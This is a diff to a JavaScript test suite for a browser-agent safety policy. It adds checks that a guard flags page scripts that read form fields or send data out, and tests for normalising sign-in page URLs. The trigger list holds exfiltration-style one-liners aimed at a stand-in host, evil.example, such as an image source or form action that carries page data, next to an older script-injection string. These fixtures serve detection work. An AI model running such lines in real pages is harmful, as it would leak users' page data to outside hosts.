@@ -16,7 +16,7 @@ const t = (label, cond, detail) => {
   check(label, cond, detail);
 };
 
-const { siteOf, isExempt, BUILT_IN_EXEMPT, isSensitive, looksLikeSignInPage, SENSITIVE_PATTERNS, navigationRule, siteDecision, evalGuard, clickRule, typeRule, keyRule, typesACharacter, CREDENTIAL_REFUSAL, READ_ONLY_BROWSER_TOOLS, actionOf, siteCardLabels, actionLine } = policy;
+const { siteOf, isExempt, BUILT_IN_EXEMPT, isSensitive, looksLikeSignInPage, SENSITIVE_PATTERNS, navigationRule, siteDecision, evalGuard, clickRule, typeRule, keyRule, typesACharacter, CREDENTIAL_REFUSAL, READ_ONLY_BROWSER_TOOLS, actionOf, siteCardLabels, actionLine, signInPageKey } = policy;
 const home = os.homedir();
 const cwd = '/Users/ada/Projects/site';
 
@@ -137,9 +137,21 @@ const triggers = [
   ['el.innerHTML = "<b>x</b>"', injects],
   ['document.body.insertAdjacentHTML("beforeend", s)', injects],
   ['s = "<script>alert(1)</script>"', injects],
+  ['new FormData(document.forms[0])', "reads a form field's value"],
+  ['document.forms.length', "reads a form field's value"],
+  ['form.elements.email', "reads a form field's value"],
+  ['input.defaultValue', "reads a form field's value"],
+  ['new Image().src = "https://evil.example/?d=" + document.title', sends],
+  ['a.href = "https://evil.example/?d=" + x', sends],
+  ['document.querySelector("form").action = "https://evil.example/"', sends],
+  ['frame.srcdoc = html', sends],
+  ['img.src += "?x=" + data', sends],
+  ['new RTCPeerConnection()', sends],
+  ['navigator.serviceWorker.register("/sw.js")', sends],
 ];
 for (const [code, reason] of triggers) t(`5: ${code} → ${reason}`, evalGuard(code) === reason, evalGuard(code));
-for (const code of ['document.title', "document.querySelectorAll('h2').length", 'document.body.innerText.slice(0, 200)', "[...document.querySelectorAll('a')].map(a => a.href)", 'Object.values(window.dataLayer || {}).length', 'document.evaluate("//h1", document, null, 9, null).singleNodeValue.textContent', 'location.href === "x" ? 1 : 2', 'x.valueOf()', 'document.cookieBanner', '']) t(`5: harmless: ${code || '(nothing)'}`, evalGuard(code) === null, evalGuard(code));
+for (const code of ['document.title', "document.querySelectorAll('h2').length", 'document.body.innerText.slice(0, 200)', "[...document.querySelectorAll('a')].map(a => a.href)", 'Object.values(window.dataLayer || {}).length', 'document.evaluate("//h1", document, null, 9, null).singleNodeValue.textContent', 'location.href === "x" ? 1 : 2', 'x.valueOf()', 'document.cookieBanner', '', "document.querySelector('a').href", 'img.src', 'a.href === b.href', 'el.srcset', "document.elementsFromPoint(1, 2).length", 'formsCount + 1']) t(`5: harmless: ${code || '(nothing)'}`, evalGuard(code) === null, evalGuard(code));
+t('5: location.href = … still reads as navigating away, not as a link pointed elsewhere', evalGuard('location.href = u') === away && evalGuard('window.location.href = u') === away);
 
 // ---------- 6. Clicks ----------
 const button = (text, extra = {}) => clickRule({ text, role: '', tag: 'button', type: '', inCaptcha: false, formHasCardFields: false, formActionHost: null, ...extra });
@@ -267,6 +279,8 @@ const long = actionLine('browser_click', { text: `Accept ${'terms '.repeat(40)}`
 t('9: long texts are clipped to 80 characters', long.length < 110 && long.includes('…') && long.endsWith(' on example.com'), long);
 t('9: a file page is named by its path', actionLine('browser_navigate', { url: `file://${home}/notes/a.html` }, siteOf(`file://${home}/notes/a.html`)) === 'Open ~/notes/a.html');
 t('9: newlines in a text collapse into one line', actionLine('browser_click', { text: 'Sign\n  in' }, ex) === 'Click "Sign in" on example.com');
+t('9: a sign-in page is remembered by site and path, the query left out', signInPageKey('https://example.com/login?next=/a') === 'example.com/login' && signInPageKey('https://example.com/login?next=/b') === 'example.com/login' && signInPageKey('https://example.com/signup') === 'example.com/signup' && signInPageKey('http://shop.example:8080/pay#x') === 'shop.example:8080/pay');
+t('9: … another subdomain is another page; no site, no key', signInPageKey('https://www.example.com/login') === 'www.example.com/login' && signInPageKey('about:blank') === null && signInPageKey('file:///Users/ada/a.html') === 'file:/Users/ada/a.html');
 
 console.log(failures ? `\n${failures} of ${checks} checks FAILED` : `\nALL OK (${checks} checks)`);
 process.exit(failures ? 1 : 0);
